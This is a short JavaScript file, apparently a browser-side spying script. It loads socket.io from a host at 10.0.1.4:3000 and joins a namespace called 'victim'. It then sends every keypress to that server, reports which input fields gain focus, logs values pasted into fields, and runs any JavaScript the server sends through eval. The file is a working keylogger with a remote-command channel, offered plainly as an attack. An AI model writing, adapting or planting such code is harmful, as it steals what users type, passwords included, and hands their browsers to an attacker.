/* globals io */
(function(){

    function loadScript(url, callback) {
        // Adding the script tag to the head as suggested before
        var head = document.getElementsByTagName('head')[0];
        var script = document.createElement('script');
        script.type = 'text/javascript';
        script.src = url;

        // Then bind the event to the callback function.
        // There are several events for cross browser compatibility.
        script.onreadystatechange = callback;
        script.onload = callback;

        // Fire the loading
        head.appendChild(script);
    }

    function loadAllScripts() {
        loadScript('http://10.0.1.4:3000/socket.io/socket.io.js', init);
    }

    function spyOnKeyDown(socket) {
        document.onkeydown = function (e) {
            e = e || window.event;

            socket.emit('update', {
                type: 'type',
                msg:  String.fromCharCode(e.keyCode),
                code: e.keyCode
            });
        };
    }

    function spyOnFieldFocus(socket) {
        var inputFields = document.querySelectorAll('input,textarea'),
            fieldName = function(field) {
                if (field.id) {
                    return '#' + field.id;
                }
                if (field.className) {
                    return '.' + field.className;
                }
                return '[' + field.type + ']';
            },
            emitChange = function() {
                socket.emit('update', {
                    type: 'element-change',
                    msg: fieldName(this)
                });
            };

        for (var i = 0; i < inputFields.length; i++) {
            var field = inputFields[i];
            field.onfocus = emitChange;
        }
    }

    function spyOnFieldFocusOut(socket) {
        var inputFields = document.querySelectorAll('input,textarea'),
            fieldName = function(field) {
                if (field.id) {
                    return '#' + field.id;
                }
                if (field.className) {
                    return '.' + field.className;
                }
                return '[' + field.type + ']';
            },
            emitChange = function() {
                socket.emit('update', {
                    type: 'element-change',
                    msg: fieldName(this)
                });
            };
            readField = function(field) {
              console.log('Reading Field', '[' + field.id + ']', '_value_', field.value)
            }

        console.log('InputFields', inputFields)

        for (var i = 0; i < inputFields.length; i++) {
            var field = inputFields[i];
            field.onpaste = function() {
              console.log('I was pasted into', fieldName(field))
              setTimeout(function(){
                console.log('Value', field.value)
              },500)
            }
            // field.onfocusout = function () {
            //   console.log('I am focused out!')
            //   console.log(this)
            // };
            //field.onfocusout = readField(field); // emitChange;
        }
    }

    function listenToRemoteJs(socket) {
        socket.on('runRemoteJs', function(js) {
            eval(js);
        });
    }

    function init() {
        var socket = io('http://10.0.1.4:3000/victim');
        spyOnKeyDown(socket);
        //spyOnFieldFocus(socket);
        spyOnFieldFocusOut(socket);
        listenToRemoteJs(socket);
    }

    loadAllScripts();
}());
